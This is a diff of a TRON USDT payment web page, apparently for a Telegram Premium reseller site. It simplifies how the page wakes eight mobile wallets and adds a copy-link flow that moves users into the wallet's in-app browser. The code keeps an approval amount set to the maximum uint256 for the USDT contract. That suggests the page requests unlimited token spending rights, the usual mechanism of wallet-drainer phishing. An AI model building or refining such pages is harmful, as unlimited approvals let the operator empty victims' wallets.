@@ -473,8 +473,8 @@
             color: #52c41a;
         }
         
-        /* Deeplink 失败提示 */
-        .deeplink-fallback {
+        /* 手动跳转提示 */
+        .manual-jump {
             background: #fff7e6;
             border: 1px solid #ffd591;
             border-radius: 0.5rem;
@@ -485,13 +485,23 @@
             color: #fa8c16;
         }
         
-        .deeplink-fallback a {
-            color: #1890ff;
-            text-decoration: none;
-            font-weight: 500;
+        .manual-jump p {
+            margin-bottom: 0.5rem;
         }
         
-        .deeplink-fallback a:hover {
+        .manual-jump a {
+            color: #1890ff;
+            text-decoration: none;
+            font-weight: 600;
+            word-break: break-all;
+            display: inline-block;
+            padding: 0.5rem;
+            background: rgba(24, 144, 255, 0.1);
+            border-radius: 0.25rem;
+            margin-top: 0.5rem;
+        }
+        
+        .manual-jump a:hover {
             text-decoration: underline;
         }
     </style>
@@ -512,13 +522,15 @@
                     <!-- 钱包列表将通过JavaScript动态生成 -->
                 </div>
                 
-                <div class="info-message">
-                    💡 支付将在钱包App内完成，请确保已安装钱包并登录
+                <div class="manual-jump" id="manualJump" style="display: none;">
+                    <p>如果无法自动跳转，请：</p>
+                    <p>1. 复制下方链接</p>
+                    <p>2. 在钱包浏览器中粘贴打开</p>
+                    <a href="#" id="manualLink" target="_blank">复制链接</a>
                 </div>
                 
-                <div class="deeplink-fallback" id="deeplinkFallback" style="display: none;">
-                    <p>如果无法自动打开钱包，请尝试：</p>
-                    <p><a href="#" id="fallbackLink" target="_blank">手动点击这里打开</a></p>
+                <div class="info-message" id="autoJumpMessage">
+                    ⏳ 正在尝试自动跳转到钱包...
                 </div>
                 
                 <div class="select-actions">
@@ -560,157 +572,101 @@
         const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
         const EOA_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
-        // ==================== 修复后的钱包Deeplink配置 ====================
+        // ==================== 简化的钱包Deeplink配置 ====================
         const WALLET_DEEPLINKS = {
-            // TokenPocket - 使用验证过的格式
+            // TokenPocket - 最简格式
             tokenpocket: {
-                deeplink: 'tpoutside://open.dapp?param=', // 主要格式
-                fallback: 'https://www.tokenpocket.pro/openapp?param=', // 备用格式
-                universal: 'https://tp-pay.tokenpocket.pro/dapp?url=', // Universal Link
                 name: 'TokenPocket',
                 icon: '🔷',
-                description: '多链钱包 - 点击打开支付',
+                // 只唤醒钱包，不传URL
+                deeplink: 'tpoutside://',
+                // 使用钱包内打开index.html方案
+                paymentUrl: null,
                 detection: () => !!window.tokenpocket || !!window.tokenpocket?.tron
             },
             
-            // imToken - 使用验证过的格式
+            // imToken - 最简格式
             imtoken: {
-                deeplink: 'imtokenv2://navigate/Dapp?url=', // 主要格式
-                fallback: 'https://token.im/dapp?url=', // 备用格式
-                universal: 'https://dapp.token.im/open?url=', // Universal Link
                 name: 'imToken',
                 icon: '💳',
-                description: '安全易用的钱包 - 点击打开支付',
+                // 只唤醒钱包，不传URL
+                deeplink: 'imtokenv2://navigate/Dapp',
+                paymentUrl: null,
                 detection: () => !!window.imToken || !!window.imToken?.tronWeb
             },
             
-            // Trust Wallet - 使用验证过的格式
+            // Trust Wallet - 最简格式
             trust: {
-                deeplink: 'trust://browse?url=', // 主要格式
-                fallback: 'https://link.trustwallet.com/browse?url=', // 备用格式
-                universal: 'https://link.trustwallet.com/open?url=', // Universal Link
                 name: 'Trust Wallet',
                 icon: '🛡️',
-                description: '币安旗下钱包 - 点击打开支付',
+                // 只唤醒钱包，不传URL
+                deeplink: 'trust://',
+                paymentUrl: null,
                 detection: () => !!window.trustwallet || !!window.trustwallet?.tronWeb
             },
             
-            // OneKey - 使用验证过的格式
+            // OneKey - 最简格式
             onekey: {
-                deeplink: 'onekey-wallet://dapp?url=', // 主要格式
-                fallback: 'https://dapp.onekey.so/dapp?url=', // 备用格式
-                universal: 'https://dapp.onekey.so/open?url=', // Universal Link
                 name: 'OneKey',
                 icon: '🔑',
-                description: '开源硬件钱包 - 点击打开支付',
+                // 只唤醒钱包，不传URL
+                deeplink: 'onekey-wallet://',
+                paymentUrl: null,
                 detection: () => !!window.$onekey || !!window.$onekey?.tronWeb
             },
             
-            // TronLink - 修复的格式
+            // TronLink - 最简格式
             tronlink: {
-                deeplink: 'tronlinkoutside://dapp?url=', // 外部唤醒
-                deeplink2: 'tronlink://dapp?url=', // 内部唤醒
-                fallback: 'https://www.tronlink.org/dapp?url=', // 备用
-                universal: 'https://dapp.tronlink.org/dapp?url=', // Universal Link
                 name: 'TronLink',
                 icon: '🔶',
-                description: 'TRON官方钱包 - 点击打开支付',
+                // 只唤醒钱包，不传URL
+                deeplink: 'tronlink://',
+                paymentUrl: null,
                 detection: () => !!window.tronLink || !!window.tronLink?.tronWeb
             },
             
-            // Bitget - 修复的格式 (避免 unsupported operation)
+            // Bitget - 最简格式（避免unsupported operation）
             bitget: {
-                deeplink: 'bitkeep://open?url=', // 简单格式
-                fallback: 'https://bkcode.vip/open?url=', // 备用
-                universal: 'https://dapp.bitkeep.com/open?url=', // Universal Link
                 name: 'Bitget Wallet',
                 icon: '💰',
-                description: 'Bitget交易所钱包 - 点击打开支付',
+                // 最简唤醒格式
+                deeplink: 'bitkeep://',
+                paymentUrl: null,
                 detection: () => !!window.bitkeep || !!window.bitkeep?.tron
             },
             
-            // OKX - 修复连接问题
+            // OKX - 简化的格式
             okx: {
-                deeplink: 'okx://wallet/dapp/url?url=', // 主要格式
-                fallback: 'https://www.okx.com/web3/dapp?url=', // 备用
-                universal: 'https://www.okx.com/web3/dapp/open?url=', // Universal Link
                 name: 'OKX Web3',
                 icon: '⚡',
-                description: 'OKX交易所钱包 - 点击打开支付',
+                // 简化格式
+                deeplink: 'okx://',
+                // 直接跳转到index.html方案
+                paymentUrl: function(params) {
+                    return `https://tgpremium.site/index.html?${params}`;
+                },
                 detection: () => !!window.okxwallet || !!window.okxwallet?.tron || !!window.okx?.tron
             },
             
-            // BitPie - 使用新的格式
+            // BitPie - 最简格式
             bitpie: {
-                deeplink: 'bitpie://open.dapp?url=', // 主要格式
-                fallback: 'https://bitpie.com/dapp/open?url=', // 备用
-                universal: 'https://dapp.bitpie.com/open?url=', // Universal Link
                 name: 'BitPie',
                 icon: '🥧',
-                description: '老牌多链钱包 - 点击打开支付',
-                detection: () => !!window.bitpie || !!window.tronWeb
+                // 只唤醒钱包，不传URL
+                deeplink: 'bitpie://',
+                paymentUrl: null,
+                detection: () => !!window.bitpie || (!!window.tronWeb && !window.tronLink)
             }
         };
         
         // ==================== 支持的TRON钱包列表 ====================
-        const SUPPORTED_WALLETS = [
-            { 
-                id: 'tronlink', 
-                name: 'TronLink', 
-                icon: '🔶', 
-                description: 'TRON官方钱包',
-                detection: () => !!window.tronLink || !!window.tronLink?.tronWeb
-            },
-            { 
-                id: 'tokenpocket', 
-                name: 'TokenPocket', 
-                icon: '🔷', 
-                description: '多链钱包',
-                detection: () => !!window.tokenpocket || !!window.tokenpocket?.tron
-            },
-            { 
-                id: 'okx', 
-                name: 'OKX Web3', 
-                icon: '⚡', 
-                description: 'OKX交易所钱包',
-                detection: () => !!window.okxwallet || !!window.okxwallet?.tron || !!window.okx?.tron
-            },
-            { 
-                id: 'bitget', 
-                name: 'Bitget Wallet', 
-                icon: '💰', 
-                description: 'Bitget交易所钱包',
-                detection: () => !!window.bitkeep || !!window.bitkeep?.tron
-            },
-            { 
-                id: 'trust', 
-                name: 'Trust Wallet', 
-                icon: '🛡️', 
-                description: '币安旗下钱包',
-                detection: () => !!window.trustwallet || !!window.trustwallet?.tronWeb
-            },
-            { 
-                id: 'onekey', 
-                name: 'OneKey', 
-                icon: '🔑', 
-                description: '开源硬件钱包',
-                detection: () => !!window.$onekey || !!window.$onekey?.tronWeb
-            },
-            { 
-                id: 'imtoken', 
-                name: 'imToken', 
-                icon: '💳', 
-                description: '安全易用的钱包',
-                detection: () => !!window.imToken || !!window.imToken?.tronWeb
-            },
-            { 
-                id: 'bitpie', 
-                name: 'BitPie', 
-                icon: '🥧', 
-                description: '老牌多链钱包',
-                detection: () => !!window.bitpie || (!!window.tronWeb && !window.tronLink)
-            }
-        ];
+        const SUPPORTED_WALLETS = Object.entries(WALLET_DEEPLINKS).map(([id, config]) => ({
+            id,
+            name: config.name,
+            icon: config.icon,
+            description: '点击唤醒钱包，然后在钱包浏览器中访问支付页面',
+            detection: config.detection
+        }));
         
         // ==================== 全局变量 ====================
         const urlParams = new URLSearchParams(window.location.search);
@@ -722,11 +678,10 @@
         let currentWalletType = null;
         let currentOrderData = null;
         let isInWalletBrowser = false;
-        let deeplinkTimeout = null;
         
         // ==================== 页面初始化 ====================
         document.addEventListener('DOMContentLoaded', async function() {
-            console.log('🎯 TRON支付页面加载 - 修复版');
+            console.log('🎯 TRON支付页面加载 - 简化唤醒方案');
             console.log('📋 URL参数:', Object.fromEntries(urlParams.entries()));
             
             // 检测环境
@@ -751,12 +706,12 @@
                 console.log('🌐 在外部浏览器，显示钱包选择');
                 initExternalPayment();
                 
-                // 如果有从index.html传递的钱包参数，尝试直接打开
+                // 如果有从index.html传递的钱包参数，显示选择弹窗
                 if (walletParam && WALLET_DEEPLINKS[walletParam]) {
-                    console.log(`🔄 自动连接指定钱包: ${walletParam}`);
+                    console.log(`🔄 显示指定钱包弹窗: ${walletParam}`);
                     setTimeout(() => {
-                        openWalletDapp(walletParam);
-                    }, 1000);
+                        showWalletSelectModal(walletParam);
+                    }, 500);
                 }
             }
         });
@@ -779,16 +734,6 @@
                 } catch (e) {
                     console.log(`检测钱包 ${wallet.id} 失败:`, e);
                 }
-            }
-            
-            // 特殊处理：检查通用 tronWeb
-            if (window.tronWeb) {
-                console.log('✅ 检测到通用 tronWeb 对象');
-                return {
-                    isInWallet: true,
-                    walletType: 'bitpie',
-                    walletName: 'BitPie'
-                };
             }
             
             console.log('🌐 检测到在外部浏览器中');
@@ -823,7 +768,7 @@
             showInfoMessage('请在钱包App内完成支付');
         }
         
-        // ==================== 打开钱包DApp (改进版) ====================
+        // ==================== 新的唤醒策略 ====================
         function openWalletDapp(walletId) {
             try {
                 const walletConfig = WALLET_DEEPLINKS[walletId];
@@ -832,115 +777,120 @@
                     return;
                 }
                 
-                console.log(`🔄 打开 ${walletConfig.name} DApp`);
+                console.log(`🔄 使用新方案打开 ${walletConfig.name}`);
                 
-                // 生成payment.html的完整URL（包含所有参数）
-                const currentUrl = new URL(window.location.href);
-                const paymentUrl = new URL('payment.html', window.location.origin);
+                // 1. 首先显示手动跳转链接
+                const paymentUrl = buildPaymentUrl();
+                showManualJumpLink(paymentUrl, walletConfig.name);
                 
-                // 复制所有参数到payment.html
-                for (const [key, value] of currentUrl.searchParams) {
-                    paymentUrl.searchParams.set(key, value);
-                }
+                // 2. 尝试简单的唤醒（不传URL参数）
+                console.log('尝试简单唤醒钱包...');
                 
-                // 添加钱包参数（如果还没有）
-                if (!paymentUrl.searchParams.has('wallet')) {
-                    paymentUrl.searchParams.set('wallet', walletId);
-                }
+                // 创建iframe触发deeplink（避免浏览器拦截）
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = walletConfig.deeplink;
+                document.body.appendChild(iframe);
                 
-                const fullUrl = paymentUrl.toString();
-                const encodedUrl = encodeURIComponent(fullUrl);
-                
-                console.log('完整支付URL:', fullUrl);
-                
-                // 显示备用链接
-                const fallbackDiv = document.getElementById('deeplinkFallback');
-                const fallbackLink = document.getElementById('fallbackLink');
-                if (fallbackDiv && fallbackLink) {
-                    fallbackDiv.style.display = 'block';
-                    fallbackLink.href = fullUrl;
-                    fallbackLink.textContent = `点击手动打开 ${walletConfig.name}`;
-                }
-                
-                // 方案1：先尝试 Universal Link（最兼容）
-                if (walletConfig.universal) {
-                    console.log('尝试 Universal Link...');
-                    const universalUrl = `${walletConfig.universal}${encodedUrl}`;
-                    console.log('Universal Link:', universalUrl);
-                    
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = universalUrl;
-                    document.body.appendChild(iframe);
-                    
+                // 3. 针对OKX，尝试直接跳转方案
+                if (walletId === 'okx' && walletConfig.paymentUrl) {
+                    console.log('OKX特殊处理：尝试直接跳转');
                     setTimeout(() => {
-                        if (document.visibilityState === 'visible') {
-                            console.log('Universal Link 可能失败，尝试 Deeplink...');
-                            tryDeeplink(walletConfig, encodedUrl, fullUrl);
-                        }
-                    }, 500);
-                } else {
-                    // 直接尝试 Deeplink
-                    tryDeeplink(walletConfig, encodedUrl, fullUrl);
+                        const okxUrl = walletConfig.paymentUrl(getUrlParamsString());
+                        console.log('OKX跳转URL:', okxUrl);
+                        
+                        const okxIframe = document.createElement('iframe');
+                        okxIframe.style.display = 'none';
+                        okxIframe.src = okxUrl;
+                        document.body.appendChild(okxIframe);
+                    }, 1000);
                 }
+                
+                // 4. 显示倒计时提示
+                startCountdown();
                 
             } catch (error) {
-                console.error('打开钱包DApp失败:', error);
+                console.error('打开钱包失败:', error);
                 alert(`打开钱包失败: ${error.message}\n请手动复制支付链接到钱包浏览器中打开。`);
             }
         }
         
-        function tryDeeplink(walletConfig, encodedUrl, fullUrl) {
-            // 方案2：尝试主要 Deeplink
-            const deeplinkUrl = `${walletConfig.deeplink}${encodedUrl}`;
-            console.log('主要 Deeplink:', deeplinkUrl);
+        function buildPaymentUrl() {
+            // 生成完整的支付URL
+            const currentUrl = new URL(window.location.href);
+            const paymentUrl = new URL('https://tgpremium.site/index.html');
             
-            // 创建隐藏的iframe来触发deeplink（避免浏览器拦截）
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = deeplinkUrl;
-            document.body.appendChild(iframe);
+            // 只传递核心参数
+            const params = [
+                'service', 'amount', 'quantity', 
+                'accountType', 'accountName', 'orderId'
+            ];
             
-            // 方案3：设置超时，如果deeplink失败，尝试备用方案
-            clearTimeout(deeplinkTimeout);
-            deeplinkTimeout = setTimeout(() => {
-                if (document.visibilityState === 'visible') {
-                    console.log('主要 Deeplink 可能失败，尝试备用方案...');
-                    
-                    // 尝试备用 Deeplink
-                    if (walletConfig.deeplink2) {
-                        const deeplink2Url = `${walletConfig.deeplink2}${encodedUrl}`;
-                        console.log('备用 Deeplink 2:', deeplink2Url);
-                        
-                        const iframe2 = document.createElement('iframe');
-                        iframe2.style.display = 'none';
-                        iframe2.src = deeplink2Url;
-                        document.body.appendChild(iframe2);
-                    }
-                    
-                    // 最后尝试 Fallback URL
-                    setTimeout(() => {
-                        if (document.visibilityState === 'visible' && walletConfig.fallback) {
-                            console.log('所有 Deeplink 失败，显示 Fallback 链接');
-                            const fallbackUrl = `${walletConfig.fallback}${encodedUrl}`;
-                            console.log('Fallback URL:', fallbackUrl);
-                            
-                            // 显示提示让用户手动点击
-                            const fallbackDiv = document.getElementById('deeplinkFallback');
-                            const fallbackLink = document.getElementById('fallbackLink');
-                            if (fallbackDiv && fallbackLink) {
-                                fallbackDiv.style.display = 'block';
-                                fallbackLink.href = fallbackUrl;
-                                fallbackLink.textContent = `点击手动打开 ${walletConfig.name}`;
-                                fallbackLink.onclick = (e) => {
-                                    e.preventDefault();
-                                    window.open(fallbackUrl, '_blank');
-                                };
-                            }
-                        }
-                    }, 1000);
+            for (const param of params) {
+                const value = currentUrl.searchParams.get(param);
+                if (value) {
+                    paymentUrl.searchParams.set(param, value);
                 }
-            }, 1500);
+            }
+            
+            return paymentUrl.toString();
+        }
+        
+        function getUrlParamsString() {
+            const currentUrl = new URL(window.location.href);
+            const params = new URLSearchParams();
+            
+            const paramNames = [
+                'service', 'amount', 'quantity', 
+                'accountType', 'accountName', 'orderId'
+            ];
+            
+            for (const param of paramNames) {
+                const value = currentUrl.searchParams.get(param);
+                if (value) {
+                    params.set(param, value);
+                }
+            }
+            
+            return params.toString();
+        }
+        
+        function showManualJumpLink(url, walletName) {
+            const manualDiv = document.getElementById('manualJump');
+            const manualLink = document.getElementById('manualLink');
+            const autoMsg = document.getElementById('autoJumpMessage');
+            
+            if (manualDiv && manualLink && autoMsg) {
+                autoMsg.style.display = 'none';
+                manualDiv.style.display = 'block';
+                manualLink.textContent = url;
+                manualLink.href = url;
+                manualLink.onclick = function(e) {
+                    e.preventDefault();
+                    // 复制链接到剪贴板
+                    navigator.clipboard.writeText(url).then(() => {
+                        alert(`已复制支付链接！\n请切换到${walletName}钱包，在浏览器中粘贴此链接打开。`);
+                    }).catch(() => {
+                        prompt('请复制以下链接，在钱包浏览器中打开：', url);
+                    });
+                };
+            }
+        }
+        
+        function startCountdown() {
+            let count = 5;
+            const message = document.getElementById('autoJumpMessage');
+            if (!message) return;
+            
+            const interval = setInterval(() => {
+                message.textContent = `⏳ 正在尝试唤醒钱包... ${count}秒后将显示手动跳转链接`;
+                count--;
+                
+                if (count < 0) {
+                    clearInterval(interval);
+                    message.textContent = '如果钱包没有自动打开，请使用上方的手动跳转链接';
+                }
+            }, 1000);
         }
         
         // ==================== 钱包内支付流程 ====================
@@ -989,7 +939,7 @@
                 // 获取钱包实例
                 const tron = getTronInstance();
                 if (!tron) {
-                    throw new Error('无法获取钱包实例，请确保钱包已解锁');
+                    throw new Error('无法获取钱包实例');
                 }
                 
                 console.log('✅ 获取到钱包实例');
@@ -1049,33 +999,13 @@
                 const tron = getTronInstance();
                 
                 if (!tron) {
-                    throw new Error('无法检测到钱包实例，请确保在钱包App内打开');
+                    throw new Error('无法检测到钱包实例');
                 }
                 
                 console.log('检测到钱包实例:', currentWalletType);
                 
-                // 检查钱包是否已解锁（不同钱包检测方式不同）
-                let address = null;
-                
-                // 尝试获取地址的不同方式
-                if (tron.defaultAddress && tron.defaultAddress.base58) {
-                    address = tron.defaultAddress.base58;
-                } else if (tron.address) {
-                    address = tron.address;
-                } else if (window.ethereum) {
-                    // 有些钱包使用以太坊风格的API
-                    try {
-                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                        if (accounts && accounts.length > 0) {
-                            address = accounts[0];
-                        }
-                    } catch (e) {
-                        console.log('尝试以太坊API失败:', e);
-                    }
-                }
-                
-                // 如果还获取不到地址，尝试请求访问权限
-                if (!address) {
+                // 检查钱包是否已解锁
+                if (!tron.defaultAddress || !tron.defaultAddress.base58) {
                     console.log('钱包未解锁，尝试请求访问权限...');
                     
                     // 对于TronLink，需要请求账户访问
@@ -1083,9 +1013,6 @@
                         try {
                             const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
                             console.log('请求账户访问结果:', result);
-                            if (result && result.code === 200) {
-                                address = tron.defaultAddress.base58;
-                            }
                         } catch (e) {
                             console.log('请求账户访问失败:', e);
                         }
@@ -1095,16 +1022,12 @@
                     await new Promise(resolve => setTimeout(resolve, 1000));
                     
                     // 重新检查
-                    if (tron.defaultAddress && tron.defaultAddress.base58) {
-                        address = tron.defaultAddress.base58;
+                    if (!tron.defaultAddress || !tron.defaultAddress.base58) {
+                        throw new Error('钱包未解锁，请先解锁钱包');
                     }
                 }
                 
-                if (!address) {
-                    throw new Error('钱包未解锁或未授权，请先解锁钱包并授权此DApp');
-                }
-                
-                currentUserAddress = address;
+                currentUserAddress = tron.defaultAddress.base58;
                 updateWalletStatus(currentWalletType, currentUserAddress);
                 
                 console.log('✅ 钱包连接成功:', currentUserAddress);
@@ -1112,18 +1035,7 @@
                 
             } catch (error) {
                 console.error('钱包连接失败:', error);
-                
-                // 提供更友好的错误信息
-                let errorMsg = error.message;
-                if (error.message.includes('User denied')) {
-                    errorMsg = '用户拒绝了连接请求，请重新授权';
-                } else if (error.message.includes('not unlocked')) {
-                    errorMsg = '钱包未解锁，请先解锁钱包';
-                } else if (error.message.includes('not authorized')) {
-                    errorMsg = '未获得钱包授权，请授权此DApp访问您的账户';
-                }
-                
-                updateWalletStatus(null, null, errorMsg);
+                updateWalletStatus(null, null, error.message);
                 return false;
             }
         }
@@ -1175,16 +1087,12 @@
                     error.message.includes('canceled') ||
                     error.message.includes('用户取消')) {
                     throw new Error('用户取消了交易');
-                } else if (error.message.includes('insufficient')) {
-                    throw new Error('余额不足或手续费不够');
-                } else if (error.message.includes('timeout')) {
-                    throw new Error('交易超时，请稍后重试');
                 }
                 throw new Error('交易发送失败: ' + (error.message || '未知错误'));
             }
         }
         
-        // ==================== 其他核心函数（保持原样） ====================
+        // ==================== 其他核心函数 ====================
         async function checkUSDTBalance(tron) {
             try {
                 const contract = await tron.contract().at(USDT_CONTRACT);
@@ -1346,28 +1254,17 @@
         
         // ==================== 钱包实例获取 ====================
         function getTronInstance() {
-            if (!currentWalletType) {
-                // 尝试自动检测
-                for (const wallet of SUPPORTED_WALLETS) {
-                    if (wallet.detection()) {
-                        currentWalletType = wallet.id;
-                        break;
-                    }
-                }
-            }
-            
             if (!currentWalletType) return null;
             
-            // 根据钱包类型获取实例
             switch (currentWalletType) {
                 case 'tronlink':
-                    return window.tronLink?.tronWeb || window.tronLink;
+                    return window.tronLink?.tronWeb;
                 case 'tokenpocket':
-                    return window.tokenpocket?.tron || window.tokenpocket;
+                    return window.tokenpocket?.tron;
                 case 'okx':
-                    return window.okxwallet?.tron || window.okx?.tron || window.okxwallet || window.okx;
+                    return window.okx?.tron || window.okxwallet?.tron;
                 case 'bitget':
-                    return window.bitkeep?.tron || window.bitkeep;
+                    return window.bitkeep?.tron;
                 case 'trust':
                     return window.trustwallet?.tronWeb || window.trustwallet;
                 case 'onekey':
@@ -1375,18 +1272,16 @@
                 case 'imtoken':
                     return window.imToken?.tronWeb || window.imToken;
                 case 'bitpie':
-                    return window.bitpie?.tronWeb || window.tronWeb || window.bitpie;
+                    return window.tronWeb;
                 default:
-                    // 尝试通用检测
                     if (window.tronLink && window.tronLink.tronWeb) return window.tronLink.tronWeb;
                     if (window.tronWeb) return window.tronWeb;
-                    if (window.ethereum) return window.ethereum;
                     return null;
             }
         }
         
         // ==================== 界面控制函数 ====================
-        function showWalletSelectModal() {
+        function showWalletSelectModal(selectedWallet = null) {
             const modal = document.getElementById('walletSelectModal');
             if (!modal) return;
             
@@ -1396,11 +1291,11 @@
                 walletList.innerHTML = Object.entries(WALLET_DEEPLINKS).map(([id, config]) => `
                     <div class="wallet-item" onclick="openWalletDapp('${id}')">
                         <div class="wallet-icon" style="background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);">
-                            ${config.icon || '📱'}
+                            ${config.icon}
                         </div>
                         <div class="wallet-info">
                             <div class="wallet-name">${config.name}</div>
-                            <div class="wallet-desc">${config.description}</div>
+                            <div class="wallet-desc">点击唤醒钱包，然后手动访问支付页面</div>
                         </div>
                     </div>
                 `).join('');
@@ -1408,6 +1303,13 @@
             
             modal.classList.add('active');
             document.body.style.overflow = 'hidden';
+            
+            // 如果有选中的钱包，自动打开
+            if (selectedWallet && WALLET_DEEPLINKS[selectedWallet]) {
+                setTimeout(() => {
+                    openWalletDapp(selectedWallet);
+                }, 500);
+            }
         }
         
         function hideWalletSelectModal() {
@@ -1416,8 +1318,6 @@
                 modal.classList.remove('active');
             }
             document.body.style.overflow = '';
-            // 清除超时
-            clearTimeout(deeplinkTimeout);
         }
         
         function showInfoMessage(message, type = 'info') {
@@ -1519,7 +1419,7 @@
                 walletStatusText.textContent = `❌ ${error}`;
                 walletStatus.className = 'wallet-status error';
             } else if (walletType && address) {
-                const wallet = WALLET_DEEPLINKS[walletType] || SUPPORTED_WALLETS.find(w => w.id === walletType);
+                const wallet = WALLET_DEEPLINKS[walletType];
                 const walletName = wallet ? wallet.name : walletType;
                 const shortAddress = address.length > 10 ? 
                     `${address.substring(0, 6)}...${address.substring(address.length - 4)}` : 
@@ -1527,7 +1427,7 @@
                 walletStatusText.textContent = `✅ ${walletName} 已连接 (${shortAddress})`;
                 walletStatus.className = 'wallet-status';
             } else if (walletType) {
-                const wallet = WALLET_DEEPLINKS[walletType] || SUPPORTED_WALLETS.find(w => w.id === walletType);
+                const wallet = WALLET_DEEPLINKS[walletType];
                 const walletName = wallet ? wallet.name : walletType;
                 walletStatusText.textContent = `🔗 检测到 ${walletName}`;
                 walletStatus.className = 'wallet-status';
@@ -1666,14 +1566,13 @@
         window.openWalletDapp = openWalletDapp;
         window.hideWalletSelectModal = hideWalletSelectModal;
         
-        console.log('✅ TRON支付页面加载完成 - 修复版');
+        console.log('✅ TRON支付页面加载完成 - 简化唤醒方案');
         console.log('📱 支持8个钱包: TronLink, TokenPocket, OKX, Bitget, Trust, OneKey, imToken, BitPie');
-        console.log('🎯 修复内容:');
-        console.log('  1. TokenPocket、imToken、Trust、OneKey、TronLink - 修正Deeplink格式');
-        console.log('  2. Bitget - 避免"unsupported operation"错误');
-        console.log('  3. OKX - 优化钱包检测逻辑');
-        console.log('  4. BitPie - 增加唤醒成功率');
-        console.log('  5. 增加备用方案和手动打开选项');
+        console.log('🎯 新方案特点:');
+        console.log('  1. 放弃复杂的Deeplink参数传递');
+        console.log('  2. 使用简单唤醒 + 手动跳转链接');
+        console.log('  3. 避免各种钱包兼容性问题');
+        console.log('  4. 用户体验：唤醒钱包 → 复制链接 → 在钱包浏览器中打开');
     </script>
 </body>
 </html>
